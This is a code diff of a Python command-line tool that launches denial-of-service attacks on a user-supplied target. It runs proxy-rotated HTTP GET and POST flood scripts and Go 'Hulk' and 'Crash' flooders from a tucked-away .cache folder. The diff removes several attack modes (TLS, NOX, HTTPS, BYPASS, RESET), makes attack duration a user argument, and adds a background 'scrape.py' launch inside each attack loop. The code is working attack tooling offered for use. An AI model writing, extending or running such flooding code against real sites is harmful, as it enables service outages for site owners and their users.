@@ -152,8 +152,6 @@ def mn_lp():
 
         Commands available:
    -  TOR   : Attack via TOR network
-   - BYPASS : Bypass defenses via TOR network
-   - FLOOD  : Flood target via TOR network
                     """
                 )
                 continue
@@ -168,50 +166,32 @@ def mn_lp():
                 ani_txt("👋 Goodbye, have a great day.", 0.02)
                 break
 
-            elif cmd in ["TOR", "FLOOD", "TLS", "NOX", "HTTPS", "BYPASS", "RESET"]:
+            elif cmd in ["TOR", "FLOOD"]:
                 try:
                     tg = parts[1]
-                    mx_tm = 300
-                    st_tm = t.time()
+                    mx_tm = int(parts[2])
                     ani_txt(f"Engaging Attack on {tg} for {mx_tm} seconds... 💥", 0.05)
+                    st_tm = t.time()
                     while t.time() - st_tm < mx_tm:
                         if cmd == "TOR":
                             rn_cmd(
-                                f'node bin/odd/.cache/TorXTor.js GET "{tg}" {mx_tm} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
+                                f'node bin/odd/.cache/TOR.js GET "{tg}" 600 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
                             )
+                            rn_cmd(f"python3 bin/odd/.cache/scrape.py &")
                             rn_cmd(
-                                f'node bin/odd/.cache/TorXTor.js POST "{tg}" {mx_tm} 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
+                                f'node bin/odd/.cache/TOR.js POST "{tg}" 600 50 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full'
                             )
                         elif cmd == "FLOOD":
                             rn_cmd(
                                 f"go run bin/odd/.cache/TorXHulk.go --site {tg} --data GET"
                             )
+                            rn_cmd(f"python3 bin/odd/.cache/scrape.py &")
                             rn_cmd(
                                 f"go run bin/odd/.cache/TorXCrash.go {tg} 9999 GET {mx_tm} nil"
                             )
-                        elif cmd == "TLS":
-                            rn_cmd(
-                                f"node bin/odd/.cache/TorXTls.js {tg} {mx_tm} 90 20 bin/odd/.cache/proxy.txt"
-                            )
-                        elif cmd == "NOX":
-                            rn_cmd(
-                                f"node bin/odd/.cache/NOX.js {tg} {mx_tm} 20 90 bin/odd/.cache/proxy.txt"
-                            )
-                        elif cmd == "HTTPS":
-                            rn_cmd(
-                                f"node bin/odd/.cache/HTTPS.js POST {tg} {mx_tm} 8 8 bin/odd/.cache/proxy.txt"
-                            )
-                        elif cmd == "BYPASS":
-                            rn_cmd(
-                                f"node bin/odd/.cache/TorXBypassV2.js {tg} {mx_tm} 90 20 bin/odd/.cache/proxy.txt"
-                            )
-                        elif cmd == "RESET":
-                            rn_cmd(
-                                f"node bin/odd/.cache/RESETV2.js {tg} {mx_tm} 8 8 bin/odd/.cache/proxy.txt --full"
-                            )
                         t.sleep(1)
                 except IndexError:
-                    print("❌ Invalid Command. Usage: <COMMAND> <TARGET>")
+                    print("❌ Invalid Command. Usage: <COMMAND> <TARGET> <TIME>")
                 except Exception as e:
                     print(f"❌ An error occurred: {e}")
                 continue
